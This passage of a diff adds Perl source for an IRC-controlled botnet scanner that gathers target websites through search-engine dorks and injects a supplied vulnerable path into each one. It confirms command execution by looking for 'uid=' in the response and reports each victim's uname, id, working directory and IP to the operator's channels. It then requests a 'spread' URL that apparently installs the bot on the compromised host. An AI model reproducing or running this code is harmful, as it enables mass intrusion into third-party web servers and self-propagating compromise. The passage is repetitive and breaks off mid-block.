+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7Al13tav3ista3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7Al13tav3ista3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7Al13tav3ista3] Safe Mode OFF: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x);
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7Al13tav3ista3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7Al13tav3ista3] Safe Mode ON: $print");
+                                  my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+                          }
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+	if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #vol
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @uol = &uolsub($dork);
+                push( my @tot, @uol );
+                my @puliti = &unici(@tot);
+                 display( $dsp,"PRIVMSG $channel :7[3$channel7] 7U3O7L 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+				 my $uni = scalar(@puliti);
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7U3O7L 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7U3O7L3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7U3O7L3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7U3O7L3] Safe Mode OFF: $print");
+								my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7U3O7L3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7U3O7L3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+                            }
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #search
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @searchlist = &search($dork);
+                my @search2    = &searchs($dork);
+                push( my @tot, @searchlist, @search2 );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 3S6E7A12R3C3H 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+                my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 3S6E7A12R3C3H 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[3S6E7A12R3C3H3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[3S6E7A12R3C3H3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[3S6E7A12R3C3H3] Safe Mode OFF: $print");
+                                my $test2 ="http://" . $site . $bug . $spread . "?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[3S6E7A12R3C3H3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[3S6E7A12R3C3H3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+								}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #msn
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @mlist = &msn($dork);
+                push( my @tot, @mlist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork"); 
+				my $uni = scalar(@puliti);
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N3] Safe Mode OFF: $print"); 
+								my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N3] Safe Mode ON: $print");
+                                 my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+ }
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #msnfr
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @mfrlist = msnfr($dork);
+                push( my @tot, @mfrlist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N FR 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N FR 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N FR3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N FR3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N FR3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N FR3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N FR3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #msnde
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @mdelist = msnde($dork);
+                push( my @tot, @mdelist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N DE 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N DE 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N DE3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N DE3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N DE3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N DE3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N DE3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #msnbe
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @mbelist = msnbe($dork);
+                push( my @tot, @mbelist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N BE 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N BE 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N BE3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N BE3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N BE3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N BE3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N BE3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #msnca
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @mcalist = msnca($dork);
+                push( my @tot, @mcalist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N CA 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N CA 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N CA3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N CA3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N CA3] Safe Mode OFF: $print"); 
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+                            }
+                        }
+                        elsif ( $re =~ /JaheeM/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Safe Mode ON: $print");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N CA3] Server Name $name1");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N CA3] Safe Mode ON: $print");
+                                my $test2 ="http://".$site.$bug.$spread."?";
+                                my $reqz = HTTP::Request->new( GET => $test2 );
+                                my $ua = LWP::UserAgent->new();
+                                my $response = $ua->request($reqz);
+
+							}
+                        }
+                    }
+                }
+            }
+            exit;
+        }
+    }
+    if ( $line =~ /PRIVMSG $channel :$start\s+(.*?)\s+(.*)/ ) { #msnjp
+        if ( my $pid = fork ) {
+            waitpid( $pid, 0 );
+        }
+        else {
+            if (fork) {
+                exit;
+            }
+            else {
+                my $bug       = $1;
+                my $dork      = $2;
+                my $contatore = 0;
+                my %hosts;
+                my @mjplist = msnjp($dork);
+                push( my @tot, @mjplist );
+                my @puliti = &unici(@tot);
+                display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N JP 12[]8[]3[] ".scalar(@tot)."3 for exploited... 3 ".scalar(@puliti)."3 =>  3$dork");
+               my $uni = scalar(@puliti);
+
+                foreach my $site (@puliti) {
+                    $contatore++;
+                    if ( $contatore % 100 == 0 ) {
+                    }
+                    if ( $contatore == $uni - 1 ) {
+                    display( $dsp,"PRIVMSG $channel :7[3$channel7] 7M3S7N JP 3FINISHED 7for 3$dork 12[]8[]3[]");
+                    }
+                    my $test  = "http://".$site.$bug.$id."?";
+                    my $print = "http://".$site.$bug.$printcmd."?";
+                    my $req   = HTTP::Request->new( GET => $test );
+                    my $ua    = LWP::UserAgent->new();
+                    $ua->timeout(5);
+                    my $response = $ua->request($req);
+                    if ( $response->is_success ) {
+                        my $re = $response->content;
+                        if ( $re =~ /JaheeM/ && $re =~ /uid=/ ) {
+                            my $hs = geths($print);
+                            $hosts{$hs}++;
+                            if ( $hosts{$hs} == "1" ) {
+                                $x = os($test);
+                                 ( $type, $space ) = split( /\,/, $x );
+                                sleep(8);
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Result...");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Uptime: $up");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N JP3] Uname -a: $un");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Id: $id1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Pwd: $pwd1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Server Ip: $ip1");
+                                display( $dsp,"PRIVMSG $channel :3[7M3S7N JP3] Server Name: $name1");
+                                display( $dsp,"PRIVMSG $admin   :3[7M3S7N JP3] Safe: $print");
+                                display( $dsp,"PRIVMSG $chanres :3[7M3S7N JP3] Safe Mode OFF: $print"); 
